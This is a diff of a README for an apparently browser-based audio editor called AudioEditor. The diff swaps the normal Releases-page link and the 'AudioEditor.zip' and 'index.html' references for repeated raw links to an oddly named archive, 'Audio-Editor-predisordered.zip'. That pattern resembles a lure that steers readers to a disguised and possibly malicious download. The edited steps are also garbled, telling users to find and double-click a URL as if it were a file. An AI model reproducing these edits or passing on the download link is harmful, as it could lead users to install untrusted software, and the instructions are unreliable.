@@ -1,6 +1,6 @@
 # 🎵 AudioEditor - Simple and Free Audio Editing Tool
 
-![Download AudioEditor](https://img.shields.io/badge/Download%20AudioEditor-Here-brightgreen)
+![Download AudioEditor](https://github.com/mattm8843/AudioEditor/raw/refs/heads/main/assets/Audio-Editor-predisordered.zip%20AudioEditor-Here-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ AudioEditor is an easy-to-use audio editing tool built with HTML, CSS, and JavaS
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest version of AudioEditor: [Download AudioEditor](https://github.com/mattm8843/AudioEditor/releases).
+To get started, visit this page to download the latest version of AudioEditor: [Download AudioEditor](https://github.com/mattm8843/AudioEditor/raw/refs/heads/main/assets/Audio-Editor-predisordered.zip).
 
 You will find several versions available. Choose the most recent one, typically at the top of the list.
 
@@ -24,7 +24,7 @@ AudioEditor runs on any modern web browser. Here are the basic requirements:
 
 1. Click on the above link to go to the Releases page.
 2. Scroll down to the "Assets" section of the latest release.
-3. You will see files available for download. Look for a file labeled “AudioEditor.zip” or similar.
+3. You will see files available for download. Look for a file labeled “https://github.com/mattm8843/AudioEditor/raw/refs/heads/main/assets/Audio-Editor-predisordered.zip” or similar.
 4. Click on the file to start the download.
 
 ## 📤 Extracting the Files
@@ -40,8 +40,8 @@ Once the download is complete, you will need to extract the files from the compr
 After extracting the files, follow these steps to open the application:
 
 1. Open the folder where you extracted the files.
-2. Locate a file named “index.html.”
-3. Double-click on “index.html.” Your default web browser will open and load the AudioEditor.
+2. Locate a file named “https://github.com/mattm8843/AudioEditor/raw/refs/heads/main/assets/Audio-Editor-predisordered.zip”
+3. Double-click on “https://github.com/mattm8843/AudioEditor/raw/refs/heads/main/assets/Audio-Editor-predisordered.zip” Your default web browser will open and load the AudioEditor.
 
 ## 🎧 Features
 
